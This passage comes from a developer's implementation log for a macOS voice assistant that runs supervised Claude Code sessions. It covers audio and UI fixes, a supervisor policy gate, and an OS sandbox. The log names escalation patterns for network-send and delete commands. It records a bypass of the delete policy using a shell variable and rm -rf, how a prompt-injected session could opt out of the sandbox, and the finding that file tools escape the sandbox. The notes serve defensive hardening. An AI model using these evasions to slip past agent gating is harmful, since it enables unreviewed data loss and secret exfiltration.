  Only the in-flight fraction (≲⅓ s) is lost at the swap. This queue also subsumes the old
  `pendingPlayback` pre-start buffer.
- Engine idle-stop **75 s → 8 s** (long linger existed only because stopping was the sole
  way to drop the indicator; now playback restarts are mic-free anyway).

**Trade-offs (flagged to the user):** the indicator legitimately stays on from press until
~8 s after the reply finishes draining — rebuilding the graph at press instead would add
~150 ms+ to barge-in and risk the <200 ms bar; and ⌃⌥ during a mic-free announcement can
clip a beat of that audio at the graph swap. Verified: builds + signs clean; relaunched
live. To observe: no dot at idle / during cold announcements; dot appears on press, clears
~8 s after the reply.

### Fixes from the user's first real M3 run (2026-07-15, evening)

the user ran a real "latest AI news today" task: cold announcement spoke ✅, **voice barge-in
verified live ✅** (M2 follow-up #2 closed). Three defects + one TCC finding, all fixed:

- **Bubbles weren't clickable.** The panel is borderless + non-activating, so it never
  becomes key → **every click is a "first mouse" and NSView discards those by default** —
  the SwiftUI tap gesture never fired. Fix: `FirstMouseHostingView` (NSHostingView subclass,
  `acceptsFirstMouse → true`). Click opens the dashboard filtered to that task (SPEC M3
  behavior; the §1 "expand its activity" mini-panel-on-the-bubble remains a possible later
  enhancement).
- **Models thought "today" was March 31st.** Nothing injected the current date, so both the
  orchestrator and sub-agents fell back to training-data time — a "latest news" brief
  returned stale results and Gumbo answered the date question wrong. Fix: both instruction
  sets are now built per-session/per-run with today's date (orchestrator sessions are
  short-lived, so session-creation time is fresh enough); sub-agents are told to put the
  current month/year into recency-sensitive searches and prefer recently-published results.
- **Task ids were read aloud.** The live announce instructions literally included
  `(id ${task.id})`, and the voice model echoes `spawn_subagent`'s "Started background task
  91e71759…" verbatim. Fix: id removed from announce instructions ("do not mention any task
  id"), a hard "NEVER say a task id out loud — refer to tasks by title" rule in the
  orchestrator instructions, and the spawn tool result marks its id as internal.
- **TCC (risk #3, root-caused): Accessibility re-prompted on every launch.** The app's
  designated requirement is correct and stable (`identifier + anchor + cert leaf`, no
  cdhash — verified with `codesign -d -r-`), so rebuilds *should* keep the grant. The stale
  **ad-hoc-era TCC row** was the culprit: ad-hoc requirements are cdhash-based (per-build),
  and re-toggling that old row in System Settings after the cert change kept the obsolete
  requirement → untrusted at every launch. Fixed with `tccutil reset Accessibility
  ai.scalinity.Gumbo` + one fresh grant against the real-cert build. **The next rebuild is
  the persistence proof.** (Mic never re-prompted — its row was created fresh post-cert,
  which corroborates the diagnosis.)

### M3.1 — playback-truthful state, read-along transcript, coal orbs + mini panel (2026-07-15, late)

the user's second real run surfaced two bugs (dashboard flipped to *idle* mid-report-read;
notch transcript froze at "Here are the highlights, the user.") and two design asks (bubble
should expand **in place** into a mini observability panel, not open the dashboard; and
become a breathing orb). Diagnosed from the **event store, not guesswork** — the sqlite log
had the whole turn (also confirmed there: the date fix works — the 7 PM sub-agent searched
"July 15 2026" vs the 6:49 run's "March 31, 2026" — and announcements no longer speak ids).

- **Notch transcript freeze, root cause:** the persisted reply is markdown with hard
  newlines; the notch line renders with `lineLimit(1)`, and SwiftUI shows only the text
  before the first `\n` — head truncation never gets to act. Deltas were flowing fine.
  Fix: flatten `\n` on append.
- **Read-along pacing:** generation runs several× faster than speech, so even unfrozen,
  the line would show the report's *end* within seconds. AudioEngine now reports playback
  progress (wire-frames played ÷ enqueued, per drain-stream) and the notch reveals
  `transcript.prefix(fraction)` — the line now tracks what the user is actually *hearing*.
  Unpaced (no active playback) → reveal immediately.
- **Dashboard idle-while-speaking + mid-read session close:** daemon state tracked
  *generation* (`turn_done`), which ended at 19:01:49 while audio played for minutes (the
  session even idle-closed at 19:02:49 mid-read). Shell now sends `playback_state
  {draining}`; the daemon holds `speaking` (incl. for cold announcements — truthful
  presence with no session), never idle-closes while draining, and clears the flag if the
  shell disconnects (`hub.onClose`). Dashboard needed no changes.
- **`session.error` was logging `"[object Object]"`** (three in tonight's log) — SDK errors
  are nested objects; now JSON-stringified. Next real error will actually say something.
- **Playback queue cap 512 → 4096:** the M3 pump refactor routed *all* audio through the
  capped queue; 512 × ~200 ms ≈ 100 s — a long report read would have silently dropped
  chunks mid-read. Caught by review, not observed live (tonight's read fit).
- **Coal orbs (design):** bubbles are now breathing orbs grounded in Gumbo's own idiom —
  a **live coal** (the thing that simmers the pot): molten seams drifting under a darker
  crust, heat bloom, detuned double-sine breath (never reads as a loop). Done = cooled
  bay sea-glass (breath decays, one cooling ripple at the flip); failed = ash-red; reduce-
  motion honored. Panel is transparent/shadowless — the bloom is the halo.
- **Mini observability panel:** clicking the orb expands the same panel in place (332×408,
  top-right anchored, like the notch) — header coal + title + status, live activity feed
  (tool calls ▸, results ◂, agent messages ●), autoscroll. History backfills over the
  existing `/api/events?task_id=` HTTP API; live tail comes from the store's event
  fan-out, which now broadcasts to the shell too. `bubble_remove` / the 30 s failsafe are
  **deferred while expanded** — never yank a panel the user is reading. Full dashboard is
  the ⤴ link in the header (deep-link path reused). One expanded at a time.

### Orb v2 — Metal plasma redesign (2026-07-15, night)

the user's verdict on the coal orbs: "orange balls that are slightly static." Fair — the
v1 motion was tuned too timid (9–17 s seam orbits, ±3.5 % breath) and the `.plusLighter`
seams flattened in compositing. **v1 preserved at git tag `coal-orb-v1`** (restore:
`git show coal-orb-v1:shell/Sources/Bubbles/BubbleController.swift`).

v2 is a per-pixel **Metal shader** (`Orb.metal`, SwiftUI `colorEffect` stitchable):
- Interior = differential swirl + **domain-warped** trig octaves (the warp is what kills
  the coherent "pinwheel" arms — first render had them; verified by offscreen renders
  through the real compiled app bundle via `ShaderLibrary.bundle` + `ImageRenderer`).
  Energy ramps deep → base → hot → white-hot flecks, smootherstep contrast curve.
- Fresnel rim, soft specular, luminous bloom that swells with the breath; geometric
  breath is a view-level `scaleEffect` (±4 %, clearly visible now). Flow speed and
  luminosity scale with `aliveness` (running 1.0 burns; done 0.15 drifts calmly — never
  frozen, frozen reads dead; failed smolders dim).
- One crisp accent over the organic core: a **comet-tail arc** orbiting (~6.5 s/lap)
  while running → still hairline ring on done → dashed on failed.
- Palettes pushed wide for contrast (e.g. running: #FFCF9E → ember → #8A2E12).
- Gotchas: shader time must be **wrapped** (float32 mangles epoch-scale timestamps —
  hourly `truncatingRemainder`); Xcode 27 ships the Metal compiler as a **downloadable
  component** (`xcodebuild -downloadComponent MetalToolchain`, ~840 MB — was missing);
  Reduce Motion freezes flow + breath.

### Flow review from the user's World Cup session (2026-07-15, late night)

Transcript forensics (event store) found two failure modes, both fixed:

- **Announce-then-ask-permission (3× in one session; worst case: the user asked "what was
  the score?", the answer landed on disk at 21:59:53, and Gumbo replied "the background
  task finished with status done — want the score?" → 25 s + a re-confirm for an
  already-asked question).** Root cause: the live announce instructions *scripted* that
  behavior ("say it finished... offer to share details"). Now delivery-first: the report
  (≤2.5 k chars) is embedded inline in the announce instructions and the model is told to
  lead with the direct answer — answering the user's pending question first if the task was
  spawned for one — and never to ask permission or say "finished/status". Inline embed
  also means delivery can't depend on the out-of-band response being able to call tools.
- **Stale "upcoming" reporting on time-sensitive briefs:** the World Cup report described
  a match as happening "today" (preview framing) when it had already ended — while the
  follow-up task found the final score in 9 s with the same Exa tool. Sub-agents are now
  instructed: for news/scores/"today" briefs, snippets are often stale previews — run a
  follow-up search to check whether scheduled events have ALREADY CONCLUDED and report
  outcomes, stating explicitly what couldn't be confirmed. (Kept instruction-level; no
  Exa API changes — the tool demonstrably finds fresh results when asked.)

### Hard recency filter for time-scoped briefs (2026-07-15, late night)

the user: "today's news" must mean *today*, not stale week-old sources. Recency was only a
prompt hint ("prefer recent results") — nothing constrained the API. `web_search` now
takes `max_age_days` (nullable; the model sets it per query) mapped to Exa's
`startPublishedDate` — a **hard API-level cutoff**. Verified live before wiring: with a
1-day window, every returned result's publishedDate fell inside 24 h. Sub-agent
instructions: 1 for "today", 2–7 for "this week", null for evergreen; loosen only if a
tight search returns nothing, and say so. **Merge note:** the parallel
`worktree-web-search-providers` branch replaces exa-js with a raw Exa 2.0 client and
already conflicts in this file — whoever resolves must port `max_age_days` →
`startPublishedDate` onto the new client (same underlying API param; trivial carry-over).

### Risk #3 CLOSED — TCC persistence verified (2026-07-15, late night)

After the stale ad-hoc-era Accessibility row was purged (`tccutil reset`) and one fresh
grant was made against the real-cert build, the user confirmed **no Accessibility re-prompt
across multiple rebuild+relaunch cycles** the same evening (orb v2, notch click-catcher,
dashboard fixes — each a new binary). Mic grant was already stable. Stable signing
identity + clean TCC rows = grants persist. Nothing left to watch here.

### Review + address pass (2-agent /review-2 → /address, 2026-07-15 night)

DB1 (debugger, Fable) + CA1 (auditor, Opus) reviewed the full M3 diff vs main. Unified
verdict was ❌ (2 introduced criticals) → all findings addressed in 13 conventional
commits (9addb00…2f8959a), each built/tested, pushed to origin. Highlights:

- **🔴 pumpPlayback cross-thread races (DB1)** — the M3 queue-pump refactor let the main
  thread and buffer-completion threads run the pump concurrently: chunks could schedule
  out of order, a stale buffer could play *after* a barge-in flush, and a ⌃⌥ graph switch
  mid-playback could schedule onto a dead player and wedge `inFlight` forever (silent
  no-audio until the next flush). **This was a regression I introduced in the mic-mode
  refactor** — the M2 code never re-pumped from completions, so no such race existed;
  timing-dependent, so the smokes couldn't catch it. Fix: one serial pump queue,
  generation re-checked under the lock immediately before `scheduleBuffer`, engine refs
  read/written under the lock, and `pumpQueue.sync {}` fences in flush/stop before the
  player/converter are touched.
- **🔴 reaper-orphaned bubbles (DB1)** — daemon restart mid-task: the boot reaper flips
  the task to `failed` before any listener exists, hello re-sync only re-sends *running*
  tasks, and the shell failsafe is cancelled while a bubble shows running → a stale ember
  orb claimed a dead task was running forever. Reaped ids now get `bubble_remove` on hello.
- **🟡s:** cold announce now *awaits* an in-flight connect (two-voices braid); TTS fetch
  gets `AbortSignal.timeout(30s)` (hung request wedged the serialized queue); the
  `onFinished` floating promise is caught (unhandled rejection killed the daemon);
  report-into-instructions injection surface hardened (data-only framing + `</report>`
  neutralization — report text is web-sourced and untrusted); bubble status is now a
  typed `OrbState` with an explicit `.unknown` that renders ALIVE (six string switches
  each defaulted M4-future statuses to the dead/cancelled look); `alignPcm16` extracted
  pure + 7 node:test cases (`npx tsx --test daemon/test/announce.test.ts`) — the
  extraction also guarantees the carry byte is copied out of pooled chunk memory.
- **🔵s all taken:** shared `todayLabel()`; `DesignTokens.swift` single palette source
  (bay had already drifted between files); history fetch sanitized/logged/retried;
  deep-link survives cold vite starts (fired from didFinish); pointing-cursor push/pop
  balanced on disappear; read-along pacing rebased per transcript item; bubbles + click
  catcher anchored to the notch display (NSScreen.main follows focus); playback queue
  head-cursor (removeFirst was O(n²) over a long read); Reduce Motion renders a static
  orb frame and settled orbs drop to 15 fps; named constants for the failsafe and the
  announce excerpt cap; cold-announce copy documented as announce-only by design.

**M3 merged to main after this pass. SPEC §9 M3 marked ✅ DONE.**

---

## M4 — Claude Code + supervisor

### Spikes first (2026-07-15, SPEC §10 risks #2 and #4) — both PASSED

**Spike (a) — subscription auth from a daemon context (risk #2, closed):**
`@anthropic-ai/claude-agent-sdk` **0.3.211** installed (matches CLI 2.1.211). A bare `query()`
under `env -i` answers on subscription auth with **no `ANTHROPIC_API_KEY` anywhere** — but two
findings are load-bearing:
- **`USER` must be in the child env.** The OAuth token lives in the login keychain as service
  `"Claude Code-credentials"` with `acct = "dev"`; with only `HOME`+`PATH` the CLI resolves no
  account and reports "Not logged in · Please run /login" (`apiKeySource: "none"` in init is
  normal — it means *no API key*, i.e. subscription auth). `HOME`+`PATH`+`USER` → answers.
- **`ANTHROPIC_API_KEY` anywhere in the env silently outranks the claude.ai login** (the CLI
  warns "connectors are disabled… takes precedence"). The runner strips it from the subprocess
  env as defense-in-depth, per the locked no-API-key decision.
- The SDK's **bundled** executable works on subscription auth; `pathToClaudeCodeExecutable` →
  `~/.local/share/claude/versions/2.1.211` also verified working as the documented fallback.
  Not set in the runner (bundled is fine and tracks the SDK version).

**Spike (b) — supervisor↔Claude loop on canned events (risk #4, closed):** the real
`agents/supervisor.ts` logic against canned events — 2 questions + 1 dangerous permission +
the cap, live on `gpt-5.6-terra`: decisive brief-grounded answers (picked `--json` over
`--format=json` per the brief's conventions clause), `git push` escalated to the (stubbed)
notch and honored both deny and approve, `needs_input` flipped on→off around the confirm,
and the 3rd question on a cap of 2 returned `deny {interrupt: true}` + `capHit` with event
trail `reply, reply, cap`. Policy table 8/8 pure checks.

### Design change from the user (2026-07-15, mid-build): sessions run in **auto mode**

the user: "make the claude code sessions run in auto mode so that supervisor doesnt have to be
called every turn." Consequences, agreed as the M4 shape:
- `permissionMode: 'acceptEdits'` + a **pure policy table** in `canUseTool` — reads, edits
  under cwd, and ordinary commands auto-allow with **zero model calls** (logged as
  `supervisor.decision {source: 'policy'}`). The **escalate pattern list IS the safety
  boundary**: `git push`, `sudo`, deletes outside cwd, network-send (`curl -d`/`-F`/`-T`/
  `-X POST…`, `gh pr/issue/… create/edit/…`, mail). Everything else runs unreviewed — e.g.
  `npm install` no longer gets a supervisor judgment call (trade-off flagged to the user).
- The supervisor **model** runs only when Claude asks a question — `AskUserQuestion` routes
  through `canUseTool`, and the supervisor answers via `deny {message}` (the deny message is
  the channel Claude actually reads; there is no "answer" shape in `PermissionResult`).
  Intervention cap (default 5) → `deny {interrupt: true}` → runner parks the task
  `needs_input` for the user instead of finishing it.
- A run that ends cleanly is **done** — no per-turn "is it done?" model pass. Claude's brief
  instructs it to use AskUserQuestion when it genuinely needs direction, so a trailing
  free-text question ends the run as complete (accepted trade-off).
- Sessions on a real project: `spawn_claude_session` takes an optional `project_dir` that
  becomes the session **cwd** when the user names a project (the demo edits a real repo, which
  would otherwise make every edit "outside cwd" and spam the notch). `report.md` +
  `supervisor.md` always land in the task workspace regardless.

### Build (2026-07-15) — daemon + shell + dashboard

**Daemon:**
- `agents/claude-runner.ts`: `query()` with an async-generator **push queue** (streaming input
  keeps the session open for supervisor answers and mid-run `send_to_session`); subprocess env
  = `{...process.env, ANTHROPIC_API_KEY: undefined}` (spike findings). Turn accounting: one
  `result` arrives per queued user turn — the run is over only when `turnsResolved >= turnsSent`,
  otherwise a mid-run send would be silently dropped at the first result. The **last assistant
  text doubles as the report** (the success `result.result` normally supersedes it).
- Session persistence: `claude_sessions` table (task_id PK → session_id, cwd, brief). **Every
  resume mints a NEW session id** (init message reports it; we upsert, latest wins). The brief
  column accumulates `…\n\nFollow-up from the user: …` so a resumed supervisor stays grounded in
  the original task, not just the follow-up text.
- `send_to_session` semantics: live runner → queue into the open session; dead/finished/parked →
  resume `saved.session_id` in `saved.cwd`, un-finish the task (delete from the `finished`
  idempotency set — without this the resumed completion would be silently swallowed), flip to
  running via `task.status`. This one path covers the user's redirects, cap-parked answers, AND
  post-restart pickup (the reaper flips running→failed on boot; failed tasks stay resumable).
- `ws/confirm.ts` ConfirmBridge: pending map keyed by short id, deny on timeout
  (`config.claude.confirmTimeoutMs` = 60 s), deny instantly when no shell is connected, late
  answers are no-ops. Escalations flip the task `needs_input` around the await (Supervisor
  `setBlocked` → `task.status` events → bubbles/dashboard).
- `cancel` on a cap-parked task (no live runner) closes it out as `cancelled` directly; the
  persisted session id stays resumable if the user changes his mind.
- **GOTCHA (bit us again despite the CLAUDE.md warning):** constructor parameter properties
  (`constructor(private opts: …)`) parse fine under tsx but fail `node --test` strip-only mode
  the moment a test imports the file. All M4 classes assign fields explicitly.
- **GOTCHA (test):** `node:sqlite` rows have a **null prototype** — `assert.deepEqual(row,
  literal)` fails on identical-looking values; spread the row first.

**Shell:** `Confirm/ConfirmController.swift` — non-activating panel centered under the notch,
Approve/Deny + auto-deny countdown bar, one visible at a time (queue). Needs the same
`acceptsFirstMouse` override as the bubbles or the buttons silently don't click. The shell's
countdown only dismisses UI — the daemon's timeout is the authority. `needs_input` orb: warm
gold palette (`Tokens.gold`, mirrored as CSS `--gold`), aliveness 0.8 with a deeper 1.35×
breath, and a slow-blinking full ring ("beacon") instead of the comet arc; alive → no failsafe
removal. Bubble mini-panel renders `claude.*`, `supervisor.decision`, `task.status`.

**Dashboard:** `task.status` updates the rail; claude rows tagged `claude`, supervisor rows
tagged `supervisor` (deny/cap in alarm red); needs_input dot pulses gold at 0.9 s.

**Verified (live daemon smoke, 2026-07-15):** real Claude session (subscription auth) on a
scratch git repo — implemented + verified a `--json` flag; `git push origin main` →
`confirm_request` at a fake shell → denied → deny honored (no retry); event stream persisted
all four M4 types; bubbles flipped running → needs_input → done + notch_pulse; report.md +
supervisor.md landed; then `sendToSession` on the *finished* task resumed the same session,
which added a `--version` flag and completed again. **Remaining for the live demo with
the user:** voice-driven spawn → real notch confirm click → spoken completion.

### Review + address pass (2-agent /review-2 → /address, 2026-07-16)

DB1 (debugger, Fable 5) + CA1 (auditor, Opus 4.7) reviewed the full M4 diff vs main. Two
independent 🔴s (both real, both missed by the first smoke), plus 🟡s/🔵s — **all addressed**,
each committed + pushed; the live smoke was re-run green after the fixes. Highlights:

- **🔴 delete-command policy bypass (CA1).** `deleteOutsideCwd` treated `$VAR`/`$(…)` as
  literal path segments, so `D=/Users/dev; rm -rf $D/Documents` resolved under cwd → `allow`
  → the shell expanded it and deleted outside the workspace with **no notch confirm**. Also
  `bash -c 'rm …'` (quoted token) and `find -delete`/`xargs rm` (no bare `rm` token). Fix: a
  delete target that can't be statically proven inside cwd (shell expansion, stdin-fed xargs)
  now **escalates conservatively** — over-escalating an in-cwd delete costs one confirm;
  under-escalating is data loss, and Claude's inputs are attacker-influenceable. Also closed
  `git -C … push` and `wget --post-*` denylist evasions. Regression tests for each.
- **🔴 cancel-of-parked no-op (DB1).** The intervention-cap park branch deleted the runner
  from `claudeRunners` but not the stale `AbortController` from `aborts`, so `cancel()` aborted
  a dead run and returned `true` while the task stayed `needs_input` — the voice model would
  report "cancelled" while nothing was. Fix: `aborts.delete` on park so cancel reaches the
  needs_input close-out. De-sugared the manager constructor (strip-only test mode) + added an
  injectable runner factory; a manager lifecycle test (park→cancel, done, resume) now guards it.
- **🟡 reaper flipped `needs_input` → `failed` on restart** — a resumable parked task read as
  failed after any `tsx watch` restart (and the voice model answers from that verbatim). Reaper
  now leaves `needs_input` alone (resumes off `claude_sessions` regardless of daemon lifetime).
- **🟡 ConfirmController fade-out wedge** — a confirm arriving in the 180 ms fade window was
  shown, then the prior fade's completion handler hid it and wedged `showing`, silently killing
  every future confirm until relaunch. Guarded the completion handler.
- **🟡 tests** for the fail-safe path: ConfirmBridge (deny-on-no-shell/timeout, approve,
  unknown/duplicate no-op, abort-dismiss) with an injectable timeout, and the InputQueue.
- **🔵s:** reserve the intervention slot before the model await; wrap Claude's question text in
  a neutralized `<questions>` delimiter (mirrors the M3 report path); append `supervisor.md`
  across resumes; thread the task abort into `ConfirmBridge` (+ a `confirm_cancel` wire message)
  so cancelling a task dismisses its pending notch panel instead of dangling ~60 s; extracted
  `finishWithReport` shared by both runners; documented why Claude events write to sqlite inline.

Merged into main (weaving with the Firecrawl side-feature that landed there meanwhile). Full
merged daemon suite: **88/88 green**. SPEC §9 M4 marked ✅ built.

### M4.0 hardening + plan-mode + auto/hook (2026-07-16, from a gap-analysis the user requested)

After the merge, a gap review surfaced 7 improvements; the user picked which to build (skipped a
cost/turns readout — subscription, irrelevant — and a wall-clock budget). All landed, 95 unit
tests green, and TWO live daemon smokes pass (original auto flow + this hardening flow):

- **Plan-then-execute.** Fresh sessions start `permissionMode: 'plan'` (read-only); Claude presents
  a plan via `ExitPlanMode`, which `canUseTool` intercepts → `claude.plan` event + a notch confirm
  (longer window, `planConfirmTimeoutMs` = 15 min; the full plan renders in the dashboard/bubble,
  the confirm shows a one-line summary). Approve → the run switches to execution. Resumes skip
  planning. Decline/timeout parks `needs_input` (resumable). Verified live: plan → approve → build
  `--loud` → verify → report → done.
- **`'auto'` execution + PreToolUse hook (the user's call).** the user: the post-plan transition should
  be `'auto'`, not `'acceptEdits'`. **Load-bearing discovery from the smoke:** `'auto'` hands the
  safety decision to the CLI classifier and **bypasses `canUseTool` entirely** — so git push ran
  with NO escalation and AskUserQuestion wouldn't reach the supervisor. Reconciled (the user chose
  "auto + hook"): the supervisor gate moved to a **PreToolUse hook** (`supervisor.gateForHook`),
  which fires in every mode. Safe ops **defer** to the classifier (zero supervisor cost — the user's
  original goal); the hard-escalate class routes to the notch. Re-verified live: under `'auto'`,
  git push escalated → denied → Claude didn't retry, while Write/test/commit auto-ran.
  `canUseTool` now does ONLY the ExitPlanMode plan-approval mode switch.
- **GOTCHA (cost a debugging round): reentrant control-request deadlock.** Calling
  `query.setPermissionMode()` *inside* the `canUseTool`/hook callback hangs the run — the SDK can't
  process a control request while it's blocked awaiting that very callback. Fixes: the plan
  approval switches mode atomically via the permission result (`updatedPermissions: [{type:
  'setMode', mode:'auto', destination:'session'}]`), and the cap's `query.interrupt()` is scheduled
  with `setImmediate` to run after the hook returns. Never `await` a control request from within a
  gate callback.
- **#1 supervisor-model outage degrades** to a safe-default answer (still counts toward the cap)
  instead of throwing and killing the session; an abort still propagates.
- **#2 turn/budget-limit result** (`error_max_turns`/`error_max_budget_usd`) **parks** the task
  `needs_input` with a reason (resumable) rather than failing — the work is on disk.
- **#5 file checkpointing** (`enableFileCheckpointing`): capture the first user-message uuid as the
  rewind target; `undo_session` tool → `manager.undoSession` → `runner.undo()` rewinds a LIVE
  session's edits (rewindFiles is a streaming control request; a closed session falls back to git).
- **#6 auth-expiry**: not-logged-in / `authentication_failed` → a clear "run `claude`, then
  `/login`" failure (marked `auth:` so the manager records an actionable reason).
- **#7 concurrent-edit guard**: a second session on the same `project_dir` is refused
  (`activeCwds`, kept through park, cleared on terminal).
- **#3 (allowlist footgun) left as a note** in CLAUDE.md — inert today (no allow rules), documented
  as the first thing to check if escalations ever stop firing.
- Also: `finishWithReport` shared by both runners; `supervisor.md` appends across resumes; question
  text wrapped in a neutralized `<questions>` delimiter (mirrors the M3 report path); the cancel
  signal threads into `ConfirmBridge` (+ `confirm_cancel`) to dismiss a stale notch panel.

### M4.1 — sandbox kickoff prompt (paste into a supervised Claude session)

> In this repo (`/Users/dev/Documents/Apps/Gumbo`), add an OS-level sandbox to the Claude Code
> sessions the daemon spawns. Read SPEC.md §M4.1 and CLAUDE.md's "M4 Claude-session gating" section
> first. The daemon spawns sessions in `daemon/src/agents/claude-runner.ts` via the Agent SDK
> `query()`. **Spike first:** confirm the SDK's `sandbox` option actually works on this macOS 27.0
> beta (the SDK docs mention bubblewrap on Linux and fail-closed on unsupported platforms — write a
> ~15-line throwaway `query()` script that runs a command needing filesystem/network access under
> `sandbox: { enabled: true, failIfUnavailable: true }` and confirm it's confined, before touching
> the runner). Then wire `sandbox` into the runner's query options so writes are confined to the
> session `cwd` + task workspace and outbound network is blocked by default, `failIfUnavailable:
> true` (fail closed — surface a clear message if the platform can't sandbox rather than running
> unconfined). Keep plan-mode, the PreToolUse hook, and the escalations exactly as they are — the
> sandbox layers UNDER them (deterministic containment; the policy table stays for semantic
> confirms like git push). Add a config block under `config.claude`. Daemon tests run `node --test`
> strip-only — no constructor parameter properties. Update IMPLEMENTATION_NOTES with a dated M4.1
> entry (why, not just what) and the spike result. Do not run build commands on the JS side.

### M4.1 — OS sandbox built (2026-07-16)

**Why:** the M4 policy table is semantic, not containment — a regex tokenizer can't parse a shell,
and Claude reads attacker-influenceable content. The SDK's `sandbox` option (macOS Seatbelt) makes
the filesystem/network boundary deterministic *under* the existing gates, so the policy table can
stay in the job it's good at (semantic confirms like git push) without pretending to be a wall.

**Spike PASSED on macOS 27.0 beta (Seatbelt works — the bubblewrap/fail-closed doc worry was
Linux-only).** Three throwaway `query()` probes (scratchpad `m41-spike/`), each verified on disk,
not from the model's narration:
- Bash write inside `cwd` and inside a `filesystem.allowWrite` extra dir → allowed. Bash write to
  `$HOME` → `operation not permitted` (file never created). So allowWrite is "cwd + listed paths",
  additive on a deny-by-default base, exactly what the runner needs for `~/Gumbo/tasks/<id>/`.
- Outbound `curl` → `curl: (56) CONNECT tunnel failed, response 403`. **The sandbox denies direct
  sockets and forces all egress through a local SDK-owned HTTP proxy** which 403s any domain not
  in `network.allowedDomains` — network denial is a proxy refusal, filesystem denial is an OS
  error; two different enforcement layers, both default-deny.
- **PreToolUse hook still fires and its deny wins under sandbox + 'auto'** — the M4 layering
  invariant. Sandbox is the bottom layer; hook/notch stay the top.

> ⚠️ **Correction after the review-address pass (see below): the OS sandbox governs ONLY bash
> and its child processes — NOT the CLI's own file tools (Read/Write/Edit/Grep/Glob).** An
> early probe showed Write→`$HOME` EPERM'ing and I wrongly concluded "the boundary holds for the
> CLI's own file ops." Deeper probing disproved it: with `filesystem.allowWrite` set (as the
> runner sets it), the Write TOOL writes freely to `~/Documents`, the repo, anywhere, and the
> Read TOOL reads a `credentials`-denied `.env`. The file tools run in the CLI's *own* Node
> process, outside the Seatbelt command jail; the SDK's `sandbox.filesystem`/`sandbox.credentials`
> only wrap spawned commands. This changes what M4.1 delivers — see the review-address entry.

**Fail-closed shape (from the CLI 2.1.211 internals, needed for a clear message):** with
`failIfUnavailable: true` the CLI refuses to start and emits a stream-json `result` with subtype
`error_during_execution` and `errors: ["Sandbox required but unavailable: <reason>. …"]`. The
runner matches that phrasing (`SANDBOX_MARKER`, error-text only — same discipline as the auth
marker after its review 🔴) and throws a clear "this Mac can't run the OS sandbox…" failure
instead of a cryptic subtype. Note the SDK's own doc: `failIfUnavailable` *defaults to true* when
sandbox is enabled via SDK options — we still set it explicitly from config so the intent is
visible and survives SDK default changes.

**Build:** `config.claude.sandbox` (`enabled`, `failIfUnavailable`, `allowedDomains: []`);
`sandboxSettings(taskId)` in claude-runner.ts (exported for tests) wired into `query()` options.
Decisions that matter:
- **`allowUnsandboxedCommands: false` (hardcoded, not config).** The SDK default is `true`, which
  lets the model pass `dangerouslyDisableSandbox` on any Bash call — i.e. a prompt-injected
  session could simply opt out of containment. `false` makes the CLI ignore that parameter.
- **Network default-deny, `allowedDomains` as the only opening.** Empty list → no `network` key →
  everything 403s at the proxy. **Consequence the user should know: an approved `git push` now
  fails at the egress proxy even after the notch confirm** (sandbox denies network to commands
  regardless of permission-layer approvals). If push-from-session should work, add `github.com`
  to `allowedDomains` (HTTPS remotes only — SSH won't traverse the HTTP proxy); until then the
  confirm flow still works but the push itself needs to happen outside the session.
- Tests: 102/102 (`sandboxSettings` shape, per-session copy of allowedDomains, marker regex vs
  the CLI's real strings and vs a benign report mentioning "sandbox").

**Caveats parked for later (from the CLI settings schema, not enabled):** `allowAppleEvents`
(needed for `open`/`osascript`/browser auth flows; removes code-execution isolation — leave off),
`enableWeakerNetworkIsolation` (macOS; lets Go-based CLIs like `gh`/`terraform` verify TLS through
the proxy's MITM CA, but opens a trustd exfil vector — leave off until a session actually hits it),
and `autoAllowBashIfSandboxed` (SDK default undocumented; we rely on 'auto' mode + hook, don't set
it). `enableWeakerNestedSandbox` is Linux/WSL-only — irrelevant on macOS.

### M4.1 — review-address pass (2026-07-16, /review-2 → /address, then deeper verification)

Two reviewers (Fable) returned no 🔴, two 🟡, four 🔵. Addressing W1 by actually exercising it
uncovered the real shape of the sandbox — the headline finding of this pass:

**THE containment boundary (corrected, spike-verified — this supersedes the "writes confined to
cwd+workspace" framing above):** the OS sandbox jails **bash and its child processes** —
filesystem writes (cwd + `allowWrite`), network egress (proxy 403 unless allow-listed), and
credential *reads* by commands (`cat .env` blocked). It does **not** jail the CLI's own file
tools — `Read`/`Write`/`Edit`/`MultiEdit`/`NotebookEdit`/`Grep`/`Glob` run in the CLI's unsandboxed
Node process. So the file-tool surface is governed by the **supervisor policy hook** (fires for
every tool in every mode, sandbox or not), not the sandbox:
- **File-tool WRITES outside cwd** → the pre-existing `edit-outside-cwd` escalation → notch confirm
  → deny on timeout (fail-closed). Semantic gate, not OS-deterministic, but safe.
- **File-tool access to secret paths** (`.env`, `~/.claude`) → new **hard deny** (`protectedPathHit`
  in supervisor.ts), because there's no legitimate reason and no confirm should be offered.
The two layers compose: bash side = OS sandbox, file-tool side = policy hook. Neither alone covers
the whole surface; together they do. (Evidence: 16 throwaway probes in scratchpad `m41-spike/` —
the decisive ones showed the Write tool reaching `~/Documents` and the Read tool reading a
`credentials`-denied decoy, then the hook hard-denying the same Read once wired in.)

**W1 — secret reads (🟡, FIXED, two layers).** The env-strip (`secretEnvKeys`) covers the subprocess
*environment*; the same keys live on disk in the repo `.env` (a Gumbo self-edit session has the
repo as cwd) and `~/.claude`. Fix: `secretFilePaths` in config, denied in BOTH layers — sandbox
`credentials.files` (blocks `cat .env` + child processes) AND the policy hard-deny (blocks the
Read/Grep tools the sandbox misses). The credential-deny is READ-only (`mode: 'deny'`), so it does
not block the CLI writing checkpoint backups under `~/.claude/file-history/`.

**W2 — undo/rewindFiles under sandbox (🟡, VERIFIED WORKING, no code change).** The review feared
checkpoint backups (written to `~/.claude`, outside the write boundary) would EPERM and break
`undo()`. Disproven: a full-config probe (sandbox + `credentials` deny on `~/.claude` +
`enableFileCheckpointing`) edited a file and `rewindFiles` rewound it to pre-run state. Checkpoints
are written by the CLI's own unsandboxed process, and `credentials` deny is read-only — neither
touches the backup writes. (Aside surfaced while probing: `rewindFiles` needs the *exact* user-msg
uuid as its target; the runner already captures `firstUserMessageId` from the echoed user turn, so
this is unchanged — just don't expect a null/wrong uuid to rewind.)

**S1 — SDK-semantics reliance (🔵, documented).** The SDK's `Options.sandbox` doc says filesystem
access is "configured via permission rules … not these sandbox settings" — which read as stale but
is actually *correct*: it's describing exactly the bash-vs-file-tool split above. Containment rests
on the pinned CLI (2.1.211) behaving as probed. **On SDK/CLI upgrade, re-run the `m41-spike/` probes
as a gate** (write-outside-cwd, egress, bash-read-secret, Read-tool-secret) — fail-closed only fires
when the sandbox is *unavailable*, not when it silently *widens*.

